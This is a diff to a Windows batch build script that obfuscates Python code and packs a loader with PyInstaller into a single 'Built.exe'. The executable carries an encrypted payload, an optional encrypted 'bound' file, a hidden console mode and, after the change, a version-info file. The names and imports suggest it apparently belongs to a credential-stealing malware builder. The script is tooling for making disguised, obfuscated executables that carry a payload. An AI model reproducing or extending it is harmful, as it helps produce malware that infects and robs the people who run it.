@@ -17,12 +17,12 @@ cls
 title Obfuscating...
 python process.py
 title Converting to exe...
-if exist "bound.exe" (set "bound=--add-binary bound.exe;.") else (set "bound=")
+if exist "bound.aes" (set "bound=--add-data bound.aes;.") else (set "bound=")
 if exist "noconsole" (set "mode=--noconsole") else (set "mode=--console")
 if exist "icon.ico" (set "icon=icon.ico") else (set "icon=NONE")
 set key=%random%%random%%random%%random%
 set key=%key:~-16%
-pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --key %key% --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data blank.aes;. %bound%
+pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --key %key% --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data blank.aes;. --version-file version.txt %bound%
 if %errorlevel%==0 (
     cls
     title Post processing...
